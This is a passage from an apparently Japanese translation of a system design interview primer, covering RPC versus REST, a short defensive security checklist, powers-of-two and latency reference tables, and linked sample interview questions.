\u7d50\u679c\u3092\u5c55\u958b\u3057\u3001\u30d7\u30ed\u30b7\u30fc\u30b8\u30e3\u30fcID\u306b\u30de\u30c3\u30c1\u3059\u308b\u30b5\u30fc\u30d0\u30fc\u30d7\u30ed\u30b7\u30fc\u30b8\u30e3\u30fc\u3092\u547c\u3073\u51fa\u3057\u3001\u7d50\u679c\u3092\u8fd4\u3057\u307e\u3059\u3002\n* \u30b5\u30fc\u30d0\u30fc\u30ec\u30b9\u30dd\u30f3\u30b9\u306f\u4e0a\u8a18\u306e\u30b9\u30c6\u30c3\u30d7\u3092\u9006\u9806\u3067\u7e70\u308a\u8fd4\u3057\u307e\u3059\u3002\n\nSample RPC calls:\n\n```\nGET \/someoperation?data=anId\n\nPOST \/anotheroperation\n{\n  \"data\":\"anId\";\n  \"anotherdata\": \"another value\"\n}\n```\n\nRPC\u306f\u632f\u308b\u821e\u3044\u3092\u516c\u958b\u3059\u308b\u3053\u3068\u306b\u7126\u70b9\u3092\u5f53\u3066\u3066\u3044\u307e\u3059\u3002RPC\u306f\u5185\u90e8\u901a\u4fe1\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u3092\u7406\u7531\u3068\u3057\u3066\u4f7f\u308f\u308c\u308b\u3053\u3068\u304c\u591a\u3044\u3067\u3059\u3002\u3068\u3044\u3046\u306e\u3082\u3001\u4f7f\u7528\u3059\u308b\u72b6\u6cc1\u306b\u5408\u308f\u305b\u3066\u30cd\u30a4\u30c6\u30a3\u30d6\u30b3\u30fc\u30eb\u3092\u81ea\u4f5c\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u304b\u3089\u3067\u3059\u3002\n\n\u30cd\u30a4\u30c6\u30a3\u30d6\u30e9\u30a4\u30d6\u30e9\u30ea\u30fc (aka SDK) \u3092\u547c\u3076\u306e\u306f\u4ee5\u4e0b\u306e\u6642:\n\n* \u30bf\u30fc\u30b2\u30c3\u30c8\u306e\u30d7\u30e9\u30c3\u30c8\u30d5\u30a9\u30fc\u30e0\u3092\u77e5\u3063\u3066\u3044\u308b\u6642\n* \u30ed\u30b8\u30c3\u30af\u304c\u3069\u306e\u3088\u3046\u306b\u30a2\u30af\u30bb\u30b9\u3055\u308c\u308b\u306e\u304b\u3092\u7ba1\u7406\u3057\u305f\u3044\u3068\u304d\n* \u30e9\u30a4\u30d6\u30e9\u30ea\u30fc\u5916\u3067\u30a8\u30e9\u30fc\u304c\u3069\u306e\u3088\u3046\u306b\u30b3\u30f3\u30c8\u30ed\u30fc\u30eb\u3055\u308c\u308b\u304b\u3092\u7ba1\u7406\u3057\u305f\u3044\u6642\n* \u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u3068\u30a8\u30f3\u30c9\u30e6\u30fc\u30b6\u30fc\u30a8\u30af\u30b9\u30da\u30ea\u30a8\u30f3\u30b9\u304c\u6700\u512a\u5148\u306e\u6642\n\n**REST** \u30d7\u30ed\u30c8\u30b3\u30eb\u306b\u5f93\u3046HTTP API\u306f\u30d1\u30d6\u30ea\u30c3\u30afAPI\u306b\u304a\u3044\u3066\u3088\u304f\u7528\u3044\u3089\u308c\u307e\u3059\u3002\n\n#### \u6b20\u70b9: RPC\n\n* RPC\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u3068\u306f\u30b5\u30fc\u30d3\u30b9\u5b9f\u88c5\u306b\u3088\u308a\u53b3\u5bc6\u306b\u5de6\u53f3\u3055\u308c\u308b\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n* \u65b0\u3057\u3044\u30aa\u30da\u30ec\u30fc\u30b7\u30e7\u30f3\u3001\u4f7f\u7528\u4f8b\u304c\u3042\u308b\u305f\u3073\u306b\u65b0\u3057\u304fAPI\u304c\u5b9a\u7fa9\u3055\u308c\u306a\u3051\u308c\u3070\u306a\u308a\u307e\u305b\u3093\u3002\n* RPC\u3092\u30c7\u30d0\u30c3\u30b0\u3059\u308b\u306e\u306f\u96e3\u3057\u3044\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\n* \u65e2\u5b58\u306e\u30c6\u30af\u30ce\u30ed\u30b8\u30fc\u3092\u305d\u306e\u307e\u307e\u4f7f\u3063\u3066\u30b5\u30fc\u30d3\u30b9\u3092\u69cb\u7bc9\u3059\u308b\u3053\u3068\u306f\u3067\u304d\u306a\u3044\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002\u4f8b\u3048\u3070\u3001[Squid](http:\/\/www.squid-cache.org\/)\u306a\u3069\u306e\u30b5\u30fc\u30d0\u30fc\u306b[RPC\u30b3\u30fc\u30eb\u304c\u6b63\u3057\u304f\u30ad\u30e3\u30c3\u30b7\u30e5](http:\/\/etherealbits.com\/2012\/12\/debunking-the-myths-of-rpc-rest\/) \u3055\u308c\u308b\u3088\u3046\u306b\u8ffd\u52a0\u3067\u9aa8\u3092\u6298\u308b\u5fc5\u8981\u304c\u3042\u308b\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002\n\n### Representational state transfer (REST)\n\nREST\u306f\u3001\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u304c\u30b5\u30fc\u30d0\u30fc\u306b\u3088\u3063\u3066\u30de\u30cd\u30fc\u30b8\u3055\u308c\u308b\u30ea\u30bd\u30fc\u30b9\u306b\u5bfe\u3057\u3066\u51e6\u7406\u3092\u884c\u3046\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u30fb\u30b5\u30fc\u30d0\u30fc\u30e2\u30c7\u30eb\u3092\u652f\u6301\u3059\u308b\u30a2\u30fc\u30ad\u30c6\u30ad\u30c1\u30e3\u30b9\u30bf\u30a4\u30eb\u3067\u3059\u3002\u30b5\u30fc\u30d0\u30fc\u306f\u64cd\u4f5c\u3067\u304d\u308b\u3082\u3057\u304f\u306f\u65b0\u3057\u3044\u30ea\u30bd\u30fc\u30b9\u30ec\u30d7\u30ec\u30bc\u30f3\u30c6\u30fc\u30b7\u30e7\u30f3\u3092\u53d7\u3051\u53d6\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u3088\u3046\u306a\u30ea\u30bd\u30fc\u30b9\u3084\u30a2\u30af\u30b7\u30e7\u30f3\u306e\u30ec\u30d7\u30ec\u30bc\u30f3\u30c6\u30fc\u30b7\u30e7\u30f3\u3092\u63d0\u4f9b\u3057\u307e\u3059\u3002\u3059\u3079\u3066\u306e\u901a\u4fe1\u306f\u30b9\u30c6\u30fc\u30c8\u30ec\u30b9\u3067\u30ad\u30e3\u30c3\u30b7\u30e5\u53ef\u80fd\u3067\u306a\u3051\u308c\u3070\u306a\u308a\u307e\u305b\u3093\u3002\n\nRESTful \u306a\u30a4\u30f3\u30bf\u30fc\u30d5\u30a7\u30fc\u30b9\u306b\u306f\u6b21\u306e\u56db\u3064\u306e\u7279\u5fb4\u304c\u3042\u308a\u307e\u3059:\n\n* **\u7279\u5fb4\u7684\u306a\u30ea\u30bd\u30fc\u30b9 (URI in HTTP)** - \u3069\u306e\u30aa\u30da\u30ec\u30fc\u30b7\u30e7\u30f3\u3067\u3042\u3063\u3066\u3082\u540c\u3058URI\u3092\u4f7f\u3046\u3002\n* **HTTP\u52d5\u8a5e\u306b\u3088\u3063\u3066\u5909\u308f\u308b (Verbs in HTTP)** - \u52d5\u8a5e\u3001\u30d8\u30c3\u30c0\u30fc\u3001\u30dc\u30c7\u30a3\u3092\u4f7f\u3046\n* **\u81ea\u5df1\u8aac\u660e\u7684\u306a\u30a8\u30e9\u30fc\u30e1\u30c3\u30bb\u30fc\u30b8 (status response in HTTP)** - \u30b9\u30c6\u30fc\u30bf\u30b9\u30b3\u30fc\u30c9\u3092\u4f7f\u3044\u3001\u65b0\u3057\u304f\u4f5c\u3063\u305f\u308a\u3057\u306a\u3044\u3053\u3068\u3002\n* **[HATEOAS](http:\/\/restcookbook.com\/Basics\/hateoas\/) (HTML interface for HTTP)** - \u81ea\u5206\u306eweb\u30b5\u30fc\u30d3\u30b9\u304c\u30d6\u30e9\u30a6\u30b6\u3067\u5b8c\u5168\u306b\u30a2\u30af\u30bb\u30b9\u3067\u304d\u308b\u3053\u3068\u3002\n\n\u30b5\u30f3\u30d7\u30eb REST \u30b3\u30fc\u30eb:\n\n```\nGET \/someresources\/anId\n\nPUT \/someresources\/anId\n{\"anotherdata\": \"another value\"}\n```\n\nREST\u306f\u30c7\u30fc\u30bf\u3092\u516c\u958b\u3059\u308b\u3053\u3068\u306b\u7126\u70b9\u3092\u5f53\u3066\u3066\u3044\u307e\u3059\u3002\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u3068\u30b5\u30fc\u30d0\u30fc\u306e\u30ab\u30c3\u30d7\u30ea\u30f3\u30b0\u3092\u6700\u5c0f\u9650\u306b\u3059\u308b\u3082\u306e\u3067\u3001\u30d1\u30d6\u30ea\u30c3\u30afAPI\u306a\u3069\u306b\u3088\u304f\u7528\u3044\u3089\u308c\u307e\u3059\u3002REST\u306fURI\u3001 [representation through headers](https:\/\/github.com\/for-GET\/know-your-http-well\/blob\/master\/headers.md)\u3001\u305d\u3057\u3066\u3001GET\u3001POST\u3001PUT\u3001 DELETE\u3001PATCH\u306a\u3069\u306eHTTP\u52d5\u8a5e\u7b49\u306e\u3088\u308a\u30b8\u30a7\u30cd\u30ea\u30c3\u30af\u3067\u7d71\u4e00\u3055\u308c\u305f\u30e1\u30bd\u30c3\u30c9\u3092\u7528\u3044\u307e\u3059\u3002\u30b9\u30c6\u30fc\u30c8\u30ec\u30b9\u3067\u3042\u308b\u306e\u3067REST\u306f\u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u3084\u30d1\u30fc\u30c6\u30a3\u30b7\u30e7\u30cb\u30f3\u30b0\u306b\u6700\u9069\u3067\u3059\u3002\n\n#### \u6b20\u70b9: REST\n\n* REST\u306f\u30c7\u30fc\u30bf\u516c\u958b\u306b\u7126\u70b9\u3092\u5f53\u3066\u3066\u3044\u308b\u306e\u3067\u3001\u30ea\u30bd\u30fc\u30b9\u304c\u81ea\u7136\u306b\u6574\u7406\u3055\u308c\u3066\u3044\u306a\u304b\u3063\u305f\u308a\u3001\u30b7\u30f3\u30d7\u30eb\u306a\u30d2\u30a8\u30e9\u30eb\u30ad\u30fc\u3067\u8868\u305b\u3089\u308c\u306a\u3044\u6642\u306b\u306f\u3088\u3044\u9078\u629e\u80a2\u3068\u306f\u8a00\u3048\u306a\u3044\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002\u4f8b\u3048\u3070\u3001\u3068\u3042\u308b\u30a4\u30d9\u30f3\u30c8\u306e\u30bb\u30c3\u30c8\u306b\u30de\u30c3\u30c1\u3059\u308b\u3059\u3079\u3066\u306e\u66f4\u65b0\u60c5\u5831\u3092\u8fd4\u3059\u3068\u8a00\u3063\u305f\u51e6\u7406\u306f\u7c21\u5358\u306b\u306f\u30d1\u30b9\u3067\u8868\u73fe\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u305b\u3093\u3002REST\u3067\u306f\u3001URI\u30d1\u30b9\u3001\u30af\u30a8\u30ea\u30d1\u30e9\u30e1\u30fc\u30bf\u3001\u305d\u3057\u3066\u5834\u5408\u306b\u3088\u3063\u3066\u306f\u30ea\u30af\u30a8\u30b9\u30c8\u30dc\u30c7\u30a3\u306a\u3069\u306b\u3088\u3063\u3066\u5b9f\u88c5\u3055\u308c\u308b\u3053\u3068\u304c\u591a\u3044\u3067\u3057\u3087\u3046\u3002\n* REST\u306f\u5c11\u6570\u306e\u52d5\u8a5e\u306b\u4f9d\u5b58\u3057\u3066\u3044\u307e\u3059(GET\u3001POST\u3001PUT\u3001DELETE\u3001\u305d\u3057\u3066 PATCH) \u304c\u6642\u306b\u306f\u4f7f\u3044\u305f\u3044\u4e8b\u4f8b\u306b\u5408\u308f\u306a\u3044\u3053\u3068\u304c\u3042\u308a\u307e\u3059\u3002\u4f8b\u3048\u3070\u3001\u671f\u9650\u306e\u5207\u308c\u305f\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u3092\u30a2\u30fc\u30ab\u30a4\u30d6\u306b\u79fb\u3057\u305f\u3044\u5834\u5408\u306a\u3069\u306f\u3053\u308c\u3089\u306e\u52d5\u8a5e\u306e\u4e2d\u306b\u306f\u7dba\u9e97\u306b\u306f\u30d5\u30a3\u30c3\u30c8\u3057\u307e\u305b\u3093\u3002\n* \u30cd\u30b9\u30c8\u3055\u308c\u305f\u30d2\u30a8\u30e9\u30eb\u30ad\u30fc\u306e\u4e2d\u306b\u3042\u308b\u30ea\u30bd\u30fc\u30b9\u3092\u3068\u3063\u3066\u304f\u308b\u306e\u306f\u30b7\u30f3\u30b0\u30eb\u30d3\u30e5\u30fc\u3092\u63cf\u753b\u3059\u308b\u306e\u306b\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u3068\u30b5\u30fc\u30d0\u30fc\u9593\u3067\u6570\u56de\u3084\u308a\u3068\u308a\u3057\u306a\u3051\u308c\u3070\u306a\u308a\u307e\u305b\u3093\u3002\u4f8b\u3068\u3057\u3066\u3001\u30d6\u30ed\u30b0\u30a8\u30f3\u30c8\u30ea\u30fc\u306e\u30b3\u30f3\u30c6\u30f3\u30c4\u3068\u305d\u308c\u306b\u5bfe\u3059\u308b\u30b3\u30e1\u30f3\u30c8\u3092\u8868\u793a\u3059\u308b\u5834\u5408\u306a\u3069\u3067\u3059\u3002\u69d8\u3005\u306a\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u74b0\u5883\u3067\u52d5\u4f5c\u3059\u308b\u53ef\u80fd\u6027\u304c\u8003\u3048\u3089\u308c\u308b\u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306b\u304a\u3044\u3066\u306f\u3053\u306e\u3088\u3046\u306a\u8907\u6570\u306e\u3084\u308a\u53d6\u308a\u306f\u597d\u307e\u3057\u304f\u3042\u308a\u307e\u305b\u3093\u3002\n* \u6642\u304c\u7d4c\u3064\u306b\u3064\u308c\u3066\u3001API\u30ec\u30b9\u30dd\u30f3\u30b9\u306b\u3088\u308a\u591a\u304f\u306e\u30d5\u30a3\u30fc\u30eb\u30c9\u304c\u4e0e\u3048\u3089\u308c\u3066\u3001\u53e4\u3044\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306f\u3059\u3067\u306b\u3044\u3089\u306a\u3044\u3082\u306e\u3082\u542b\u3081\u3066\u3059\u3079\u3066\u306e\u30c7\u30fc\u30bf\u30d5\u30a3\u30fc\u30eb\u30c9\u3092\u53d7\u3051\u53d6\u308b\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\u305d\u306e\u3053\u3068\u3067\u3001\u30da\u30a4\u30ed\u30fc\u30c9\u304c\u5927\u304d\u304f\u306a\u308a\u3059\u304e\u3066\u3001\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u3082\u62e1\u5927\u3059\u308b\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\n\n### RPC\u3068REST\u6bd4\u8f03\n\n| Operation | RPC | REST |\n|---|---|---|\n| \u30b5\u30a4\u30f3\u30a2\u30c3\u30d7\t| **POST** \/signup | **POST** \/persons |\n| \u30ea\u30b6\u30a4\u30f3\t| **POST** \/resign<br\/>{<br\/>\"personid\": \"1234\"<br\/>} | **DELETE** \/persons\/1234 |\n| Person\u8aad\u307f\u8fbc\u307f | **GET** \/readPerson?personid=1234 | **GET** \/persons\/1234 |\n| Person\u306e\u30a2\u30a4\u30c6\u30e0\u30ea\u30b9\u30c8\u8aad\u307f\u8fbc\u307f | **GET** \/readUsersItemsList?personid=1234 | **GET** \/persons\/1234\/items |\n| Person\u306e\u30a2\u30a4\u30c6\u30e0\u3078\u306e\u30a2\u30a4\u30c6\u30e0\u8ffd\u52a0 | **POST** \/addItemToUsersItemsList<br\/>{<br\/>\"personid\": \"1234\";<br\/>\"itemid\": \"456\"<br\/>} | **POST** \/persons\/1234\/items<br\/>{<br\/>\"itemid\": \"456\"<br\/>} |\n| \u30a2\u30a4\u30c6\u30e0\u66f4\u65b0\t| **POST** \/modifyItem<br\/>{<br\/>\"itemid\": \"456\";<br\/>\"key\": \"value\"<br\/>} | **PUT** \/items\/456<br\/>{<br\/>\"key\": \"value\"<br\/>} |\n| \u30a2\u30a4\u30c6\u30e0\u524a\u9664 | **POST** \/removeItem<br\/>{<br\/>\"itemid\": \"456\"<br\/>} | **DELETE** \/items\/456 |\n\n<p align=\"center\">\n  <i><a href=https:\/\/apihandyman.io\/do-you-really-know-why-you-prefer-rest-over-rpc\/>Source: Do you really know why you prefer REST over RPC<\/a><\/i>\n<\/p>\n\n#### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8: REST \u3068 RPC\n\n* [Do you really know why you prefer REST over RPC](https:\/\/apihandyman.io\/do-you-really-know-why-you-prefer-rest-over-rpc\/)\n* [When are RPC-ish approaches more appropriate than REST?](http:\/\/programmers.stackexchange.com\/a\/181186)\n* [REST vs JSON-RPC](http:\/\/stackoverflow.com\/questions\/15056878\/rest-vs-json-rpc)\n* [Debunking the myths of RPC and REST](http:\/\/etherealbits.com\/2012\/12\/debunking-the-myths-of-rpc-rest\/)\n* [What are the drawbacks of using REST](https:\/\/www.quora.com\/What-are-the-drawbacks-of-using-RESTful-APIs)\n* [Crack the system design interview](http:\/\/www.puncsky.com\/blog\/2016-02-13-crack-the-system-design-interview)\n* [Thrift](https:\/\/code.facebook.com\/posts\/1468950976659943\/)\n* [Why REST for internal use and not RPC](http:\/\/arstechnica.com\/civis\/viewtopic.php?t=1190508)\n\n## \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\n\n\u3053\u306e\u30bb\u30af\u30b7\u30e7\u30f3\u306f\u66f4\u65b0\u304c\u5fc5\u8981\u3067\u3059\u3002[contributing](#contributing)\u3057\u3066\u304f\u3060\u3055\u3044\uff01\n\n\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u306f\u5e45\u5e83\u3044\u30c8\u30d4\u30c3\u30af\u3067\u3059\u3002\u5341\u5206\u306a\u7d4c\u9a13\u3001\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5206\u91ce\u306e\u30d0\u30c3\u30af\u30b0\u30e9\u30a6\u30f3\u30c9\u304c\u306a\u304f\u3066\u3082\u3001\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u306e\u77e5\u8b58\u3092\u8981\u3059\u308b\u8077\u306b\u5fdc\u52df\u3059\u308b\u306e\u3067\u306a\u3044\u9650\u308a\u3001\u57fa\u672c\u4ee5\u4e0a\u306e\u3053\u3068\u3092\u77e5\u308b\u5fc5\u8981\u306f\u306a\u3044\u3067\u3057\u3087\u3046\u3002\n\n* \u60c5\u5831\u4f1d\u9054\u3001\u4fdd\u5b58\u306b\u304a\u3051\u308b\u6697\u53f7\u5316\n* [XSS](https:\/\/en.wikipedia.org\/wiki\/Cross-site_scripting) \u3084 [SQL injection](https:\/\/en.wikipedia.org\/wiki\/SQL_injection)\u3092\u9632\u3050\u305f\u3081\u306b\u3001\u5168\u3066\u306e\u30e6\u30fc\u30b6\u30fc\u5165\u529b\u3082\u3057\u304f\u306f\u30e6\u30fc\u30b6\u30fc\u306b\u9732\u51fa\u3055\u308c\u308b\u5165\u529b\u30d1\u30e9\u30e1\u30fc\u30bf\u30fc\u3092\u30b5\u30cb\u30bf\u30a4\u30ba\u3059\u308b\n* SQL injection\u3092\u9632\u3050\u305f\u3081\u306b\u30d1\u30e9\u30e1\u30fc\u30bf\u5316\u3055\u308c\u305f\u30af\u30a8\u30ea\u3092\u7528\u3044\u308b\u3002\n* [least privilege](https:\/\/en.wikipedia.org\/wiki\/Principle_of_least_privilege)\u306e\u539f\u7406\u3092\u7528\u3044\u308b\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8:\n\n* [\u958b\u767a\u8005\u306e\u305f\u3081\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30ac\u30a4\u30c9](https:\/\/github.com\/FallibleInc\/security-guide-for-developers)\n* [OWASP top ten](https:\/\/www.owasp.org\/index.php\/OWASP_Top_Ten_Cheat_Sheet)\n\n## \u88dc\u907a\n\n\u6697\u7b97\u3067\u3001\u63a8\u8a08\u5024\u3092\u6c42\u3081\u308b\u5fc5\u8981\u304c\u3042\u308b\u3053\u3068\u3082\u6642\u306b\u306f\u3042\u308a\u307e\u3059\u3002\u4f8b\u3048\u3070\u3001\u30c7\u30a3\u30b9\u30af\u304b\u3089100\u679a\u30a4\u30e1\u30fc\u30b8\u5206\u306e\u30b5\u30e0\u30cd\u30a4\u30eb\u3092\u4f5c\u308b\u6642\u9593\u3092\u6c42\u3081\u305f\u308a\u3001\u305d\u306e\u6642\u306b\u3069\u308c\u3060\u3051\u30c7\u30a3\u30b9\u30af\u30e1\u30e2\u30ea\u30fc\u304c\u6d88\u8cbb\u3055\u308c\u308b\u304b\u306a\u3069\u306e\u5024\u3067\u3059\u3002**2\u306e\u4e57\u6570\u8868** \u3068 **\u5168\u3066\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u77e5\u308b\u3079\u304d\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u5024** \u306f\u826f\u3044\u53c2\u8003\u306b\u306a\u308b\u3067\u3057\u3087\u3046\u3002\n\n### 2\u306e\u4e57\u6570\u8868\n\n```\n\u4e57\u6570           \u53b3\u5bc6\u306a\u5024         \u7d04        Bytes\n---------------------------------------------------------------\n7                             128\n8                             256\n10                           1024   1 thousand           1 KB\n16                         65,536                       64 KB\n20                      1,048,576   1 million            1 MB\n30                  1,073,741,824   1 billion            1 GB\n32                  4,294,967,296                        4 GB\n40              1,099,511,627,776   1 trillion           1 TB\n```\n\n#### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8:\n\n* [2\u306e\u4e57\u6570\u8868](https:\/\/en.wikipedia.org\/wiki\/Power_of_two)\n\n### \u5168\u3066\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u77e5\u308b\u3079\u304d\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u5024\n\n```\nLatency Comparison Numbers\n--------------------------\nL1 cache reference                           0.5 ns\nBranch mispredict                            5   ns\nL2 cache reference                           7   ns                      14x L1 cache\nMutex lock\/unlock                           25   ns\nMain memory reference                      100   ns                      20x L2 cache, 200x L1 cache\nCompress 1K bytes with Zippy            10,000   ns       10 us\nSend 1 KB bytes over 1 Gbps network     10,000   ns       10 us\nRead 4 KB randomly from SSD*           150,000   ns      150 us          ~1GB\/sec SSD\nRead 1 MB sequentially from memory     250,000   ns      250 us\nRound trip within same datacenter      500,000   ns      500 us\nRead 1 MB sequentially from SSD*     1,000,000   ns    1,000 us    1 ms  ~1GB\/sec SSD, 4X memory\nDisk seek                           10,000,000   ns   10,000 us   10 ms  20x datacenter roundtrip\nRead 1 MB sequentially from 1 Gbps  10,000,000   ns   10,000 us   10 ms  40x memory, 10X SSD\nRead 1 MB sequentially from disk    30,000,000   ns   30,000 us   30 ms 120x memory, 30X SSD\nSend packet CA->Netherlands->CA    150,000,000   ns  150,000 us  150 ms\n\nNotes\n-----\n1 ns = 10^-9 seconds\n1 us = 10^-6 seconds = 1,000 ns\n1 ms = 10^-3 seconds = 1,000 us = 1,000,000 ns\n```\n\n\u4e0a\u8a18\u8868\u306b\u57fa\u3065\u3044\u305f\u5f79\u306b\u7acb\u3064\u6570\u5024:\n\n* \u30c7\u30a3\u30b9\u30af\u304b\u3089\u306e\u9023\u7d9a\u8aad\u307f\u53d6\u308a\u901f\u5ea6 30 MB\/s\n* 1 Gbps Ethernet\u304b\u3089\u306e\u9023\u7d9a\u8aad\u307f\u53d6\u308a\u901f\u5ea6\u3000100 MB\/s\n* SSD\u304b\u3089\u306e\u9023\u7d9a\u8aad\u307f\u53d6\u308a\u901f\u5ea6 1 GB\/s\n* main memory\u304b\u3089\u306e\u9023\u7d9a\u8aad\u307f\u53d6\u308a\u901f\u5ea6 4 GB\/s\n* 1\u79d2\u3067\u5730\u74036-7\u5468\u3067\u304d\u308b\n* 1\u79d2\u3067\u30c7\u30fc\u30bf\u30bb\u30f3\u30bf\u30fc\u30682000\u5468\u3084\u308a\u3068\u308a\u3067\u304d\u308b\n\n#### \u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u306e\u8996\u899a\u7684\u8868\n\n![](https:\/\/camo.githubusercontent.com\/77f72259e1eb58596b564d1ad823af1853bc60a3\/687474703a2f2f692e696d6775722e636f6d2f6b307431652e706e67)\n\n#### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8:\n\n* [\u5168\u3066\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u77e5\u308b\u3079\u304d\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u5024 - 1](https:\/\/gist.github.com\/jboner\/2841832)\n* [\u5168\u3066\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u77e5\u308b\u3079\u304d\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u5024 - 2](https:\/\/gist.github.com\/hellerbarde\/2843375)\n* [Designs, lessons, and advice from building large distributed systems](http:\/\/www.cs.cornell.edu\/projects\/ladis2009\/talks\/dean-keynote-ladis2009.pdf)\n* [Software Engineering Advice from Building Large-Scale Distributed Systems](https:\/\/static.googleusercontent.com\/media\/research.google.com\/en\/\/people\/jeff\/stanford-295-talk.pdf)\n\n### \u4ed6\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u4f8b\u984c\n\n> \u983b\u51fa\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u8ab2\u984c\u3068\u305d\u306e\u89e3\u7b54\u3078\u306e\u30ea\u30f3\u30af\n\n| \u8cea\u554f | \u89e3\u7b54 |\n|---|---|\n| Dropbox\u306e\u3088\u3046\u306a\u30d5\u30a1\u30a4\u30eb\u540c\u671f\u30b5\u30fc\u30d3\u30b9\u3092\u8a2d\u8a08\u3059\u308b | [youtube.com](https:\/\/www.youtube.com\/watch?v=PE4gwstWhmc) |\n| Google\u306e\u3088\u3046\u306a\u691c\u7d22\u30a8\u30f3\u30b8\u30f3\u306e\u8a2d\u8a08 | [queue.acm.org](http:\/\/queue.acm.org\/detail.cfm?id=988407)<br\/>[stackexchange.com](http:\/\/programmers.stackexchange.com\/questions\/38324\/interview-question-how-would-you-implement-google-search)<br\/>[ardendertat.com](http:\/\/www.ardendertat.com\/2012\/01\/11\/implementing-search-engines\/)<br\/>[stanford.edu](http:\/\/infolab.stanford.edu\/~backrub\/google.html) |\n| Google\u306e\u3088\u3046\u306a\u30b9\u30b1\u30fc\u30e9\u30d6\u30eb\u306aweb\u30af\u30ed\u30fc\u30e9\u30fc\u306e\u8a2d\u8a08 | [quora.com](https:\/\/www.quora.com\/How-can-I-build-a-web-crawler-from-scratch) |\n| Google docs\u306e\u8a2d\u8a08 | [code.google.com](https:\/\/code.google.com\/p\/google-mobwrite\/)<br\/>[neil.fraser.name](https:\/\/neil.fraser.name\/writing\/sync\/) |\n| Redis\u306e\u3088\u3046\u306a\u30ad\u30fc\u30d0\u30ea\u30e5\u30fc\u30b9\u30c8\u30a2\u306e\u8a2d\u8a08 | [slideshare.net](http:\/\/www.slideshare.net\/dvirsky\/introduction-to-redis) |\n| Memcached\u306e\u3088\u3046\u306a\u30ad\u30e3\u30c3\u30b7\u30e5\u30b7\u30b9\u30c6\u30e0\u306e\u8a2d\u8a08 | [slideshare.net](http:\/\/www.slideshare.net\/oemebamo\/introduction-to-memcached) |\n| Amazon\u306e\u3088\u3046\u306a\u30ec\u30b3\u30e1\u30f3\u30c7\u30fc\u30b7\u30e7\u30f3\u30b7\u30b9\u30c6\u30e0\u306e\u8a2d\u8a08 | [hulu.com](http:\/\/tech.hulu.com\/blog\/2011\/09\/19\/recommendation-system.html)<br\/>[ijcai13.org](http:\/\/ijcai13.org\/files\/tutorial_slides\/td3.pdf) |\n| Bitly\u306e\u3088\u3046\u306aURL\u77ed\u7e2e\u30b5\u30fc\u30d3\u30b9\u306e\u8a2d\u8a08 | [n00tc0d3r.blogspot.com](http:\/\/n00tc0d3r.blogspot.com\/) |\n| WhatsApp\u306e\u3088\u3046\u306a\u30c1\u30e3\u30c3\u30c8\u30a2\u30d7\u30ea\u306e\u8a2d\u8a08 | [highscalability.com](http:\/\/highscalability.com\/blog\/2014\/2\/26\/the-whatsapp-architecture-facebook-bought-for-19-billion.html)\n| Instagram\u306e\u3088\u3046\u306a\u5199\u771f\u5171\u6709\u30b5\u30fc\u30d3\u30b9\u306e\u8a2d\u8a08 | [highscalability.com](http:\/\/highscalability.com\/flickr-architecture)<br\/>[highscalability.com](http:\/\/highscalability.com\/blog\/2011\/12\/6\/instagram-architecture-14-million-users-terabytes-of-photos.html) |\n| Facebook\u30cb\u30e5\u30fc\u30b9\u30d5\u30a3\u30fc\u30c9\u306e\u8a2d\u8a08 | [quora.com](http:\/\/www.quora.com\/What-are-best-practices-for-building-something-like-a-News-Feed)<br\/>[quora.com](http:\/\/www.quora.com\/Activity-Streams\/What-are-the-scaling-issues-to-keep-in-mind-while-developing-a-social-network-feed)<br\/>[slideshare.net](http:\/\/www.slideshare.net\/danmckinley\/etsy-activity-feeds-architecture) |\n| Facebook\u30bf\u30a4\u30e0\u30e9\u30a4\u30f3\u306e\u8a2d\u8a08 | 